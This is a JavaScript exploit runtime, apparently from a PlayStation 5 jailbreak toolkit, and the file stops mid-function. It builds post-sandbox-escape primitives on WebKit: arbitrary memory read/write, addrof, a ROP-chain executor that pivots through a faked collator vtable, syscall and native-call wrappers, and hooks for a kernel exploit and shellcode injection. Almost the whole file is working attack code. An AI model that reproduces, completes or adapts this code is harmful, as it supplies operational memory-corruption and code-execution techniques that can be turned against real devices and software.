// slopkit/lapse-runtime.js
//
// Y2JB-shape runtime shim that satisfies the globals lapse.js expects.
// Built on top of the primitives lapse.html leaves alive after the WebKit
// sandbox escape:
//
//   window.slopkit = {
//     candidate,           // JSC cell that aliases rwView's Butterfly
//     rwView,              // Uint8Array whose vector we can aim anywhere
//     aimCarrier,          // (cand, addr) -> rewrites vector to `addr`
//     restoreCarrier,      // (cand)       -> restores the original vector
//     arenaView,           // Uint8Array over the fake-UCollator arena
//     arenaBacking,        // arena backing kernel address
//     fakeUCollatorAddress,// arenaBacking + FAKE_UCOLLATOR_OFFSET
//     fakeVtableAddress,   // arenaBacking + FAKE_VTABLE_OFFSET
//     compareFn,           // Intl.Collator.prototype.compare bound
//     kernelBase,          // libkernel_web base (misnomer inherited from notify.html)
//     webkitBase,          // libSceNKWebKit2 base
//     naturalTrampolineAddress,
//     FW_VERSION,          // "10.01" etc.
//     lapseOffsets,        // per-fw kernel + gadget table (see lapse-offsets.json)
//     screenLine, mark,    // logging shims from notify.html
//   }
//
// Phase-3 state (all globals lapse.js references are backed):
//   REAL — read/write 8/16/32/64 (userland R/W anywhere via aimCarrier),
//     addrof / get_backing_store (JSC layout bootstrap on targetHolder),
//     runChain (ROP-chain executor: writes into arena, pivots via
//     `mov rsp, rdi; ret`, exits via `mov rsp, rbp; pop rbp; ret`),
//     syscall / call (5-arg — no pop_r9 in webkit), malloc (arena tail
//     -> mmap slab), create_pipe (arena or kernel-R/W fallback),
//     nanosleep, ipv6_kernel_rw.{init,read_buffer,write_buffer,
//     copyout,copyin}, kernel.{read,write}_{qword,dword,word,byte},
//     return_value_addr / return_value_buf (view into arena RETVAL).
//   REPLACED (semantics differ from Y2JB but observable behavior same):
//     pwn(fake_frame)      → runChain(window.rop_chain) with Y2JB exit-
//                            tail (pop_rbp; saved_fp; mov_rsp_rbp)
//                            stripped so compareFn's RBP is preserved.
//     get_bytecode_addr()  → arena scratch address (lapse.js's write64
//                            bytecode-poking lands harmlessly there).
//   STILL STUBBED (loud errors, need external artifacts):
//     load_aioshellcode — fetches aioshellcode.bin (Y2JB blob) and does
//       mmap-RW → copyin → mprotect-RX → kernel patch, but the kernel
//       patch point RVA (kernel_offset.AIO_FREE_ENTRY_RVA) and the
//       KERNEL_TEXT_FROM_KDATA delta need per-fw extraction from
//       kernel.dec.bin. Without the aioshellcode.bin blob the whole
//       injection fails at fetch time with a clear message.
//
// Every remaining error path throws with a message that pinpoints the
// missing artifact (blob / kernel offset / firmware-dump extraction).

(function () {
    "use strict";

    if (!window.slopkit) {
        throw new Error("lapse-runtime: slopkit primitives not exposed");
    }
    const S = window.slopkit;

    //////////////////////////////////////////////////////////////////////////
    // Helpers
    //////////////////////////////////////////////////////////////////////////

    function toHex(v) {
        if (typeof v === "bigint") {
            return "0x" + v.toString(16);
        }
        if (typeof v === "number") {
            return "0x" + Math.floor(v).toString(16);
        }
        return String(v);
    }
    window.toHex = toHex;

    function stub(name) {
        return function () {
            throw new Error("lapse-runtime: " + name
                + " not implemented — needs per-fw gadgets/offsets");
        };
    }

    //////////////////////////////////////////////////////////////////////////
    // BigInt address <-> Number bridge
    //
    // lapse.js uses BigInt for addresses throughout. slopkit's aimCarrier
    // takes a Number (safe-integer address). We accept both.
    //////////////////////////////////////////////////////////////////////////

    function toAddrNumber(a) {
        if (typeof a === "bigint") {
            if (a < 0n || a > 0xffffffffffffn) {
                throw new Error("address out of range: " + a.toString(16));
            }
            const n = Number(a);
            if (!Number.isSafeInteger(n)) {
                throw new Error("address not safe integer: " + a.toString(16));
            }
            return n;
        }
        if (typeof a === "number") return a;
        throw new Error("bad address type: " + typeof a);
    }

    function toValueBigInt(v) {
        if (typeof v === "bigint") return v;
        if (typeof v === "number") return BigInt(Math.floor(v));
        throw new Error("bad value type: " + typeof v);
    }

    //////////////////////////////////////////////////////////////////////////
    // Real R/W: reuse slopkit's aimCarrier + rwView
    //////////////////////////////////////////////////////////////////////////

    function read8(addr)  {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        return BigInt(S.rwView[0]);
    }
    function read16(addr) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        return BigInt(S.rwView[0]) | (BigInt(S.rwView[1]) << 8n);
    }
    function read32(addr) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        let x = 0n;
        for (let i = 0; i < 4; ++i)
            x |= BigInt(S.rwView[i]) << (8n * BigInt(i));
        return x;
    }
    function read64(addr) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        let x = 0n;
        for (let i = 0; i < 8; ++i)
            x |= BigInt(S.rwView[i]) << (8n * BigInt(i));
        return x;
    }

    function write8(addr, v) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        const b = toValueBigInt(v) & 0xffn;
        S.rwView[0] = Number(b);
    }
    function write16(addr, v) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        const b = toValueBigInt(v);
        S.rwView[0] = Number(b & 0xffn);
        S.rwView[1] = Number((b >> 8n) & 0xffn);
    }
    function write32(addr, v) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        const b = toValueBigInt(v);
        for (let i = 0; i < 4; ++i)
            S.rwView[i] = Number((b >> (8n * BigInt(i))) & 0xffn);
    }
    function write64(addr, v) {
        S.aimCarrier(S.candidate, toAddrNumber(addr));
        const b = toValueBigInt(v);
        for (let i = 0; i < 8; ++i)
            S.rwView[i] = Number((b >> (8n * BigInt(i))) & 0xffn);
    }

    window.read8  = read8;
    window.read16 = read16;
    window.read32 = read32;
    window.read64 = read64;
    window.write8  = write8;
    window.write16 = write16;
    window.write32 = write32;
    window.write64 = write64;

    function read_null_terminated_string(addr) {
        const bytes = [];
        let cur = typeof addr === "bigint" ? addr : BigInt(addr);
        for (let i = 0; i < 4096; ++i) {
            const b = Number(read8(cur));
            if (b === 0) break;
            bytes.push(b);
            cur = cur + 1n;
        }
        return String.fromCharCode.apply(null, bytes);
    }
    window.read_null_terminated_string = read_null_terminated_string;

    //////////////////////////////////////////////////////////////////////////
    // Bases exposed as lapse expects
    //
    // NOTE: slopkit's `kernelBase` is actually libkernel_web (the userland
    // library, misnomer). In Y2JB, `libc_base` is libkernel base. So we alias
    // libc_base = slopkit.kernelBase. `kernel` (the module) is a placeholder
    // that gets its `read_qword/write_qword/...` populated once
    // ipv6_kernel_rw is initialized inside lapse.js.
    //////////////////////////////////////////////////////////////////////////

    window.libc_base = BigInt(S.kernelBase);
    window.PAGE_SIZE = 0x4000;

    window.FW_VERSION = String(S.FW_VERSION);

    //////////////////////////////////////////////////////////////////////////
    // SYSCALL / ROP tables — lapse.js *extends* these with its own numbers,
    // so we provide empty objects to attach to. The real syscall numbers
    // for the ones lapse.js does NOT set (socket, setsockopt, getsockopt,
    // bind, listen, accept, connect, close, read, write, fcntl,
    // getsockname) must also be here since Y2JB pre-populated them.
    //////////////////////////////////////////////////////////////////////////

    window.SYSCALL = window.SYSCALL || {
        // FreeBSD 11 / PS5 syscall numbers used by Y2JB + aioshellcode (BigInt)
        read:            3n,
        write:           4n,
        open:            5n,
        close:           6n,
        getpid:          20n,
        mprotect:        74n,
        fcntl:           92n,
        socket:          97n,
        connect:         98n,
        accept:          30n,
        bind:            104n,
        setsockopt:      105n,
        listen:          106n,
        getsockname:     32n,
        getsockopt:      118n,
        mmap:            477n,
        // PS5-specific JIT syscalls (from published sources)
        jitshm_create:   533n,
        jitshm_alias:    534n,
        // extended by lapse.js at load: pipe, unlink, socketpair, thr_self,
        // thr_exit, sched_yield, thr_new, cpuset_getaffinity,
        // cpuset_setaffinity, rtprio_thread, evf_create/delete/set/clear,
        // thr_suspend_ucontext, thr_resume_ucontext, aio_multi_delete/
        // wait/poll/cancel, aio_submit_cmd.
    };

    // ROP gadgets are drawn from TWO bases:
    //   webkit         = libSceNKWebKit.sprx (== slopkit.webkitBase)
    //                    — every pop/mov/ret gadget
    //   libkernel_web  = libkernel_web.sprx  (== slopkit.kernelBase)
    //                    — syscall_wrapper + setjmp/longjmp
    // A per-fw entry looks like: { rva: "0xNNN", pad: N, desc: "..." }
    // where `pad` is how many extra qwords the chain must include after the
    // pop's popped value to burn trailing pops in the same gadget tail.
    //
    // We surface `window.ROP` as BigInt addresses and `window.ROP_PAD` as
    // the parallel pad table (for hand-inspection / debugging). The lapse
    // chain builder (below) knows to insert the extra pad qwords.
    const off      = S.lapseOffsets || {};
    const offWK    = off.webkit || {};
    const offLKW   = off.libkernel_web || {};
    const webkitB  = BigInt(S.webkitBase);
    const kernelB  = BigInt(S.kernelBase);

    function throwMissingGadget(name) {
        throw new Error("lapse-runtime: ROP gadget '" + name + "' missing"
            + " for FW " + S.FW_VERSION
            + " — populate slopkit/offsets/lapse-offsets.json");
    }

    window.ROP = {};
    window.ROP_PAD = {};

    function bindGadget(name, source, base) {
        const g = source[name];
        if (!g || g.rva === null || g.rva === undefined) {
            Object.defineProperty(window.ROP, name, {
                get: () => throwMissingGadget(name), configurable: true,
            });
            window.ROP_PAD[name] = null;
            return;
        }
        window.ROP[name] = base + BigInt(g.rva);
        window.ROP_PAD[name] = g.pad || 0;
    }

    // WebKit-provided gadgets
    for (const name of ["pop_rax", "pop_rdi", "pop_rsi", "pop_rdx",
                        "pop_rcx", "pop_rbx", "pop_rbp", "pop_r8",
                        "mov_qword_rdi_rax", "mov_rsp_rbp", "ret",
                        "pivot_rdi_rsp"]) {
        bindGadget(name, offWK, webkitB);
    }

    // libkernel_web-provided gadgets
    for (const name of ["syscall_wrapper", "setjmp", "longjmp"]) {
        bindGadget(name, offLKW, kernelB);
    }

    // mov_rax_0x200000000 doesn't exist naturally in either module.
    // lapse.js's ONE use is in call_suspend_chain_rop() to load a JSC-tagged
    // double before pivoting back. Substitute with `pop_rax; 0x200000000n`
    // in the chain builder. Expose a Proxy that throws so it's loud if
    // anything else references it.
    Object.defineProperty(window.ROP, "mov_rax_0x200000000", {
        get: function () {
            throw new Error("lapse-runtime: mov_rax_0x200000000 not"
                + " available on browser — replace with pop_rax + 0x200000000n"
                + " in the chain (see lapse.js:387).");
        },
        configurable: true,
    });

    // Expose setjmp/longjmp raw addresses at top level (lapse.js reads them
    // from `libc_base + 0x58F80` in init_threading — that path already works
    // through libc_base; keep the ROP binding for symmetry).

    // syscall_wrapper as a top-level global (lapse.js references it bare).
    Object.defineProperty(window, "syscall_wrapper", {
        get: function () { return window.ROP.syscall_wrapper; },
        configurable: true,
    });

    //////////////////////////////////////////////////////////////////////////
    // ROP-chain executor built on slopkit's collator vtable one-shot.
    //
    // Arena layout (0x1000 bytes total, values from notify.html):
    //   0x100 .. 0x1e7  FAKE_UCOLLATOR  — trampoline reads [+0xe0], [+0x48], [+0x60]
    //   0x300 .. 0x430  FAKE_VTABLE     — vtable dispatch land
    //   0x500 .. 0xef8  ROP_CHAIN       — up to 500 qwords of ROP payload
    //   0xf00 .. 0xf07  SYSCALL_RETVAL  — 8-byte scratch for syscall rax
    //   0xf08 .. 0xff8  MALLOC_ARENA    — small userland heap (240 bytes)
    //
    // Execution model:
    //   1. Serialize a chain of BigInt qwords into ROP_CHAIN.
    //   2. Set [FAKE_UCOLLATOR+0xe0] = ROP.pivot_rdi_rsp
    //             [FAKE_UCOLLATOR+0x48] = arenaBacking + ROP_CHAIN
    //   3. Fire compareFn(scratch, "b"):
    //        - collator dispatch reaches the natural trampoline
    //        - trampoline sets rdi = arenaBacking+ROP_CHAIN, jumps to pivot
    //        - pivot: mov rsp, rdi; ret  → RSP now points at ROP_CHAIN
    //        - chain runs; ends with mov_rsp_rbp; pop rbp; ret which restores
    //          compareFn's frame and returns to JS.
    //   4. compareFn's return value on this path is meaningless (rax was
    //      clobbered by the chain), but we don't care — return values
    //      travel through SYSCALL_RETVAL.
    //////////////////////////////////////////////////////////////////////////

    const FAKE_UCOLLATOR = 0x100;
    const ROP_CHAIN      = 0x500;
    const ROP_CHAIN_CAP  = 0xa00;    // bytes available for the chain
    const RETVAL_OFFSET  = 0xf00;
    const MALLOC_OFFSET  = 0xf08;
    const MALLOC_CAP     = 0xf8;
    const ARENA_END      = 0x1000;

    if (!S.arenaView || !S.arenaBacking || !S.armAndFire) {
        throw new Error("lapse-runtime: arena primitives missing "
            + "(need arenaView, arenaBacking, armAndFire)");
    }

    const arena         = S.arenaView;
    const arenaBaseAddr = BigInt(S.arenaBacking);

    function writeQwordArena(off, val) {
        const v = typeof val === "bigint" ? val : BigInt(val);
        for (let i = 0; i < 8; ++i)
            arena[off + i] = Number((v >> (8n * BigInt(i))) & 0xffn);
    }

    function readQwordArena(off) {
        let v = 0n;
        for (let i = 0; i < 8; ++i)
            v |= BigInt(arena[off + i]) << (8n * BigInt(i));
        return v;
    }

    // Append a value to a chain array, expanding for the gadget's trailing
    // pops (`pad` from the offsets table).
    function chainPush(chain, val) {
        chain.push(typeof val === "bigint" ? val : BigInt(val));
    }

    function chainPop(chain, reg, value) {
        const key = "pop_" + reg;
        const gadget = window.ROP[key];    // may throw if missing
        const pad = window.ROP_PAD[key] || 0;
        chainPush(chain, gadget);
        chainPush(chain, value);
        for (let i = 0; i < pad; ++i)
            chainPush(chain, 0n);          // burn trailing pops with 0
    }

    function chainCallDirect(chain, target) {
        chainPush(chain, target);           // just a plain gadget-tail-style call
    }

    function chainExit(chain) {
        chainPush(chain, window.ROP.mov_rsp_rbp);
    }

    let ropExecCount = 0;

    function runChain(chain) {
        if (chain.length * 8 > ROP_CHAIN_CAP)
            throw new Error("runChain: chain too long ("
                + chain.length + " qwords, cap " + (ROP_CHAIN_CAP/8) + ")");

        // Zero the ROP-chain region so leftover bytes from a prior run can't
        // be interpreted as gadgets if the chain overshoots its own tail.
        for (let i = ROP_CHAIN; i < ROP_CHAIN + ROP_CHAIN_CAP; ++i)
            arena[i] = 0;
        for (let i = 0; i < chain.length; ++i)
            writeQwordArena(ROP_CHAIN + i * 8, chain[i]);

        // Clear the return-value slot so we can detect writes.
        for (let i = 0; i < 8; ++i) arena[RETVAL_OFFSET + i] = 0;

        // Aim the trampoline:
        //   trampoline target  = pivot gadget (jumped to via push+ret)
        //   trampoline RDI-in  = arena ROP chain start (becomes RSP after pivot)
        //   trampoline RCX-in  = 0 (unused by chain but must be a defined value)
        writeQwordArena(FAKE_UCOLLATOR + 0xe0, window.ROP.pivot_rdi_rsp);
        writeQwordArena(FAKE_UCOLLATOR + 0x48, arenaBaseAddr + BigInt(ROP_CHAIN));
        writeQwordArena(FAKE_UCOLLATOR + 0x60, 0n);

        // Fire through slopkit's armAndFire (re-arms collator, dispatches,
        // restores collator bytes so JS's Collator object stays valid).
        try {
            S.armAndFire("g", "b");
        } catch (e) {
            throw new Error("runChain: dispatch threw — "
                + (e && e.message));
        }
        ropExecCount++;
        return readQwordArena(RETVAL_OFFSET);
    }

    window._slopkit_runChain = runChain;
    window._slopkit_chainPop = chainPop;
    window._slopkit_chainCallDirect = chainCallDirect;
    window._slopkit_chainExit = chainExit;

    //////////////////////////////////////////////////////////////////////////
    // syscall(number, ...args)
    //////////////////////////////////////////////////////////////////////////

    function syscall(num, a1, a2, a3, a4, a5, a6) {
        // FreeBSD ABI: syscall# in rax; args in rdi,rsi,rdx,rcx,r8,r9.
        // Our syscall_wrapper is `mov r10, rcx; syscall; ret` (proper conv).
        // pop_r9 is unavailable in webkit — first syscall that needs 6 args
        // will fail. lapse.js currently uses <=5 args everywhere.
        if (a6 !== undefined)
            throw new Error("syscall: 6th arg (r9) unsupported — "
                + "no pop_r9 gadget in libSceNKWebKit");

        const c = [];
        if (a1 !== undefined) chainPop(c, "rdi", a1);
        if (a2 !== undefined) chainPop(c, "rsi", a2);
        if (a3 !== undefined) chainPop(c, "rdx", a3);
        if (a4 !== undefined) chainPop(c, "rcx", a4);
        if (a5 !== undefined) chainPop(c, "r8",  a5);
        chainPop(c, "rax", num);
        chainCallDirect(c, window.ROP.syscall_wrapper);

        // Capture return value: pop rdi = &arena+RETVAL, mov [rdi], rax.
        chainPop(c, "rdi", arenaBaseAddr + BigInt(RETVAL_OFFSET));
        chainCallDirect(c, window.ROP.mov_qword_rdi_rax);

        chainExit(c);
        return runChain(c);
    }
    window.syscall = syscall;

    //////////////////////////////////////////////////////////////////////////
    // malloc — small userland heap.
    //
    // For lapse.js's needs, malloc is only used to build syscall argument
    // structs. Sizes are tiny (<=0x100 bytes each) and the total footprint
    // per stage is small. We serve them out of the arena's tail (MALLOC_CAP
    // bytes = 248 bytes total). For anything larger we fall back to an
    // mmap syscall — but mmap needs syscall to work first.
    //
    // The malloc pointer we return is the KERNEL/PROCESS address (usable by
    // syscalls). Reads/writes to that memory go through arenaView by
    // computing the offset back to arena[0].
    //////////////////////////////////////////////////////////////////////////

    let mallocBump = 0;
    let mmapSlabAddr = 0n;
    let mmapSlabBump = 0;
    const MMAP_SLAB_SIZE = 0x100000;    // 1 MB slab — grows lazily
    const PAGE = 0x4000;

    function malloc(nbytes) {
        const size = typeof nbytes === "bigint" ? Number(nbytes) : (nbytes | 0);
        if (size <= 0) throw new Error("malloc: bad size " + size);
        const alignedSize = (size + 7) & ~7;

        // Fast path — carve from arena tail (240 bytes).
        if (mallocBump + alignedSize <= MALLOC_CAP) {
            const off = MALLOC_OFFSET + mallocBump;
            mallocBump += alignedSize;
            for (let i = 0; i < alignedSize; ++i) arena[off + i] = 0;
            return arenaBaseAddr + BigInt(off);
        }

        // Slab path — carve from a lazily-grown mmap slab. Refill when the
        // current slab lacks room for the requested chunk.
        if (mmapSlabAddr === 0n
            || mmapSlabBump + alignedSize > MMAP_SLAB_SIZE) {
            const slabSize = Math.max(MMAP_SLAB_SIZE,
                (alignedSize + PAGE - 1) & ~(PAGE - 1));
            // FreeBSD mmap: syscall 477
            //   mmap(0, size, PROT_R|PROT_W, MAP_ANON|MAP_PRIVATE, -1, 0)
            const rv = syscall(477n, 0n, BigInt(slabSize), 3n, 0x1002n,
                0xffffffffffffffffn);
            if (rv === 0xffffffffffffffffn)
                throw new Error("malloc: mmap slab failed (size "
                    + slabSize + ")");
            mmapSlabAddr = rv;
            mmapSlabBump = 0;
        }
        const addr = mmapSlabAddr + BigInt(mmapSlabBump);
        mmapSlabBump += alignedSize;
        // MAP_ANON pages come pre-zeroed by the kernel — no zeroing needed.
        return addr;
    }
    window.malloc = malloc;

    //////////////////////////////////////////////////////////////////////////
    // create_pipe, nanosleep — thin syscall wrappers
    //////////////////////////////////////////////////////////////////////////

    // Read primitives for arbitrary process addresses. Fast path: if `addr`
    // falls inside our arena, read directly from arenaView (userland R/W).
    // Slow path: if ipv6_kernel_rw is initialized, kernel.read_* can walk
    // any address (kernel-mode reads see all mapped memory including
    // process pages). Otherwise throw with a clear message.
    function readByteAt(addr) {
        const off = Number(addr - arenaBaseAddr);
        if (off >= 0 && off < ARENA_END) return arena[off];
        if (window.ipv6_kernel_rw && window.ipv6_kernel_rw.data.initialized)
            return window.kernel.read_byte(addr);
        throw new Error("readByteAt: 0x" + addr.toString(16)
            + " not in arena and kernel R/W not initialized yet");
    }
    function readIntAt(addr) {
        const off = Number(addr - arenaBaseAddr);
        if (off >= 0 && off + 4 <= ARENA_END) {
            return (arena[off]
                | (arena[off+1] << 8)
                | (arena[off+2] << 16)
                | (arena[off+3] << 24)) >>> 0;
        }
        if (window.ipv6_kernel_rw && window.ipv6_kernel_rw.data.initialized)
            return window.kernel.read_dword(addr);
        throw new Error("readIntAt: 0x" + addr.toString(16)
            + " not in arena and kernel R/W not initialized yet");
    }
    window._slopkit_readIntAt = readIntAt;
    window._slopkit_readByteAt = readByteAt;

    window.create_pipe = function create_pipe() {
        const fds = malloc(8);              // int[2]
        const rv = syscall(window.SYSCALL.pipe, fds);
        if (rv === 0xffffffffffffffffn)
            throw new Error("create_pipe: pipe() failed");
        // fds may live in arena tail (fast path) OR in an mmap chunk
        // (slow path — requires kernel R/W). readIntAt handles both.
        const rfd = readIntAt(fds + 0n);
        const wfd = readIntAt(fds + 4n);
        return [BigInt.asUintN(32, BigInt(rfd)),
                BigInt.asUintN(32, BigInt(wfd))];
    };

    //////////////////////////////////////////////////////////////////////////
    // selfTest — call getpid via ROP+syscall and verify the return value.
    //
    // This is the ground-truth check that the whole runtime is wired up:
    // - ROP chain executor pivots correctly
    // - syscall_wrapper reaches the FreeBSD kernel
    // - return value flows through mov_qword_rdi_rax
    // - control returns to JS via mov_rsp_rbp
    //
    // Returns { ok, pid, err }. lapse.html can call this pre-handoff.
    //////////////////////////////////////////////////////////////////////////

    window.lapseRuntimeSelfTest = function selfTest() {
        const r = { ok: false, pid: null, addrof_targetHolder: null,
                    backing_store: null, err: null };
        try {
            r.pid = window.syscall(window.SYSCALL.getpid);
            if (!(r.pid > 0n && r.pid < 0x100000n))
                throw new Error("bad pid: 0x" + r.pid.toString(16));

            // addrof round-trip: addrof(targetHolder) MUST equal
            // slopkit.targetAddress. If not, our bootstrap's slot-layout
            // assumption is wrong.
            const th = window.addrof(S.targetHolder);
            r.addrof_targetHolder = th;
            const expect = BigInt(S.targetAddress) & PTR_MASK;
            if (th !== expect)
                throw new Error("addrof(targetHolder)=0x" + th.toString(16)
                    + " expected 0x" + expect.toString(16));

            // get_backing_store on a fresh Uint8Array. The returned vector
            // should be an aligned userland pointer in the WebKit heap band.
            const probe = new Uint8Array(0x40);
            probe[0] = 0xa5;
            const vec = window.get_backing_store(probe);
            r.backing_store = vec;
            if (vec === 0n || vec % 8n !== 0n)
                throw new Error("get_backing_store returned unaligned 0x"
                    + vec.toString(16));

            r.ok = true;
            return r;
        } catch (e) {
            r.err = (e && e.message) || String(e);
            return r;
        }
    };

    window.nanosleep = function nanosleep(ns) {
        // struct timespec { time_t sec; long nsec; }  — 16 bytes
        const ts = malloc(16);
        const nn = typeof ns === "bigint" ? ns : BigInt(ns);
        const sec = nn / 1_000_000_000n;
        const nsec = nn - sec * 1_000_000_000n;
        // Use window.write64 — works on any userland address (aimCarrier +
        // rwView) so mmap-backed timespecs are fine too.
        window.write64(ts, sec);
        window.write64(ts + 8n, nsec);
        return syscall(240n, ts, 0n);
    };

    //////////////////////////////////////////////////////////////////////////
    // Y2JB call-suspend-chain plumbing.
    //
    // Y2JB's `call_suspend_chain` builds an in-place bytecode-hijack trick
    // to detour a JSC function into a ROP chain that thread-suspends the
    // target and returns a safe tagged double to JS. That's very JSC-
    // -version-specific and needs `pwn`/`call`/`get_bytecode_addr` — see
    // stubs below. For now, expose the plumbing globals so lapse.js can at
    // least assign to them without ReferenceError.
    //////////////////////////////////////////////////////////////////////////

    // Y2JB uses `return_value_addr`/`return_value_buf` as a preallocated
    // qword pair (address + BigUint64Array view) for capturing the syscall/
    // call return value out of ROP. We satisfy the same shape by pointing
    // them at our arena's RETVAL_OFFSET slot.
    window.return_value_addr   = arenaBaseAddr + BigInt(RETVAL_OFFSET);
    (function makeReturnValueBuf() {
        // A BigUint64Array view over the RETVAL_OFFSET slot in `arenaView`'s
        // underlying ArrayBuffer. Reads through this always reflect the
        // latest chain-produced rax.
        const abuf = arena.buffer;
        window.return_value_buf = new BigUint64Array(abuf, RETVAL_OFFSET, 1);
    })();
    //////////////////////////////////////////////////////////////////////////
    // Y2JB's rop_chain / saved_fp / fake_frame / pwn / get_bytecode_addr.
    //
    // In Y2JB (game-context) these were used because there was no native
    // syscall/call primitive — the bytecode-hijack trick was the only way
    // to detour execution into a ROP chain. In slopkit we HAVE runChain(),
    // so we short-circuit:
    //
    //   `rop_chain` is a BigUint64Array that lapse.js populates with a ROP
    //   payload, then calls `pwn(fake_frame)`. We interpret pwn as "execute
    //   rop_chain via runChain()".
    //
    //   `get_bytecode_addr()` returns a scratch address in the arena so
    //   that lapse.js's `write64(bc_start, ...)` bytecode-patching writes
    //   land harmlessly on our scratch memory (they don't need to actually
    //   patch bytecode — pwn just runs the ROP chain we wrote).
    //
    // `fake_frame` and `saved_fp` are ignored — Y2JB used them to detour
    // return control back to JS, but our chain-exit `mov_rsp_rbp; pop rbp;
    // ret` handles that.
    //////////////////////////////////////////////////////////////////////////

    window.rop_chain  = new BigUint64Array(512);
    window.saved_fp   = 0n;
    window.fake_frame = null;

    // Scratch memory for get_bytecode_addr() writes. Small — enough for the
    // few write64 calls lapse.js's call_suspend_chain does.
    const BC_SCRATCH_OFFSET = MALLOC_OFFSET;   // shares arena tail
    window.get_bytecode_addr = function get_bytecode_addr() {
        return arenaBaseAddr + BigInt(BC_SCRATCH_OFFSET);
    };

    // Detect and strip Y2JB's function-return exit tail:
    //     pop_rax, 0x200000000n, pop_rbp, <saved_fp>, mov_rsp_rbp
    // Y2JB used this to pivot back into a JSC function's cell as a "safe
    // tagged double" return trick. In our slopkit context we don't want to
    // clobber compareFn's RBP frame pointer — our clean exit is a single
    // mov_rsp_rbp that inherits compareFn's RBP. So we strip the pop_rbp
    // + saved_fp pair and leave a single mov_rsp_rbp at the end.
    function stripY2JBExitTail(chain) {
        // Look for `... pop_rbp, X, mov_rsp_rbp` at the tail.
        if (chain.length < 3) return;
        const n = chain.length;
        if (chain[n-1] === window.ROP.mov_rsp_rbp
            && chain[n-3] === window.ROP.pop_rbp) {
            // Strip pop_rbp + its value (positions n-3 and n-2), leaving
            // mov_rsp_rbp at the new tail.
            chain.splice(n - 3, 2);
        }
    }

    window.pwn = function pwn(_fakeFrame) {
        // Serialize window.rop_chain (BigUint64Array) into a chain array,
        // truncating at the last non-zero qword (chain length isn't tracked
        // by the writer otherwise). Ensure it ends with a single clean
        // mov_rsp_rbp that inherits compareFn's RBP.
        const src = window.rop_chain;
        if (!src || !src.length)
            throw new Error("pwn: rop_chain not populated");
        const chain = [];
        let lastNonZero = -1;
        for (let i = 0; i < src.length; ++i) {
            chain.push(src[i]);
            if (src[i] !== 0n) lastNonZero = i;
        }
        chain.length = lastNonZero + 1;
        stripY2JBExitTail(chain);
        if (chain.length === 0
            || chain[chain.length - 1] !== window.ROP.mov_rsp_rbp) {
            chain.push(window.ROP.mov_rsp_rbp);
        }
        const rv = runChain(chain);
        // Zero the chain so a subsequent stale invocation doesn't re-run
        // stale gadgets left behind.
        for (let i = 0; i < src.length; ++i) src[i] = 0n;
        return rv;
    };

    //////////////////////////////////////////////////////////////////////////
    // call(addr, ...args) — call a native function at `addr` with up to
    // 5 args, return rax. Same ROP shape as syscall() but without the
    // syscall_wrapper detour.
    //////////////////////////////////////////////////////////////////////////

    function callNative(addr, a1, a2, a3, a4, a5, a6) {
        if (a6 !== undefined)
            throw new Error("call: 6-arg (r9) unsupported — no pop_r9 gadget");
        const c = [];
        if (a1 !== undefined) chainPop(c, "rdi", a1);
        if (a2 !== undefined) chainPop(c, "rsi", a2);
        if (a3 !== undefined) chainPop(c, "rdx", a3);
        if (a4 !== undefined) chainPop(c, "rcx", a4);
        if (a5 !== undefined) chainPop(c, "r8",  a5);
        chainCallDirect(c, addr);
        // Capture rax to RETVAL_OFFSET.
        chainPop(c, "rdi", arenaBaseAddr + BigInt(RETVAL_OFFSET));
        chainCallDirect(c, window.ROP.mov_qword_rdi_rax);
        chainExit(c);
        return runChain(c);
    }
    window.call = callNative;
    // create_pipe / nanosleep — real implementations installed earlier;
    // do NOT re-stub here. addrof / get_backing_store follow below.

    //////////////////////////////////////////////////////////////////////////
    // addrof(obj) — get a JS object's cell address.
    //
    // Strategy: use slopkit's `targetHolder` object (whose cell address we
    // know = S.targetAddress) as an addrof probe. targetHolder holds six
    // object properties (q0..q5); at least one of them was assigned an
    // object whose kernel address we also know (nativeTargetAddress,
    // arenaViewAddress, or realCollatorAddress). We scan targetHolder's
    // cell memory and butterfly for a boxed JSValue matching one of those
    // known addresses; that tells us the byte offset where a property slot
    // lives. Then addrof(obj) = set the corresponding property to obj and
    // read the boxed JSValue back at that offset.
    //
    // JSC object memory layout:
    //   cell + 0x00 : cell header (structureID, flags)
    //   cell + 0x08 : butterfly pointer
    //   cell + 0x10 : inline property slot 0     <- q0 for small objects
    //   cell + 0x18 : inline property slot 1     <- q1
    //   cell + 0x20 : inline property slot 2     <- q2
    //   ...
    // For objects that have overflowed inline capacity, properties live in
    // the butterfly at NEGATIVE offsets from the butterfly ptr (butterfly
    // grows downward for out-of-line properties, upward for indexed).
    //
    // Object JSValue encoding: (0xFFFF000000000000 | cell_addr).
    //////////////////////////////////////////////////////////////////////////

    const OBJECT_TAG = 0xFFFF000000000000n;
    const OBJECT_TAG_MASK = 0xFFFF000000000000n;
    const PTR_MASK = 0x0000FFFFFFFFFFFFn;

    function readQwordAt(addr) {
        S.aimCarrier(S.candidate, Number(BigInt.asUintN(64, addr)));
        let v = 0n;
        for (let i = 0; i < 8; ++i)
            v |= BigInt(S.rwView[i]) << (8n * BigInt(i));
        return v;
    }

    function isJSObjectValue(v) {
        return (v & OBJECT_TAG_MASK) === OBJECT_TAG
            && (v & PTR_MASK) !== 0n;
    }

    // Bootstrap: locate the JSValue slot in targetHolder that corresponds
    // to a KNOWN property. We know:
    //   targetHolder.q0 = parseInt (nativeTargetAddress)
    //   targetHolder.q1 = arenaView (arenaViewAddress)
    //   targetHolder.q2 = realCollator (realCollatorAddress)
    //
    // Scan targetHolder cell and its butterfly for a JSValue whose low-48
    // bits match one of these. Return {baseAddr, propIndex, stride} so we
    // can compute the address of ANY q<i> slot.
    let addrofState = null;

    function addrofBootstrap() {
        if (!S.targetAddress || !S.targetHolder)
            throw new Error("addrof: slopkit.targetHolder/Address missing");

        const knownAddrs = new Map();
        if (S.nativeTargetAddress)
            knownAddrs.set(BigInt(S.nativeTargetAddress) & PTR_MASK, 0);
        if (S.arenaViewAddress)
            knownAddrs.set(BigInt(S.arenaViewAddress) & PTR_MASK, 1);
        if (S.realCollatorAddress)
            knownAddrs.set(BigInt(S.realCollatorAddress) & PTR_MASK, 2);
        if (knownAddrs.size === 0)
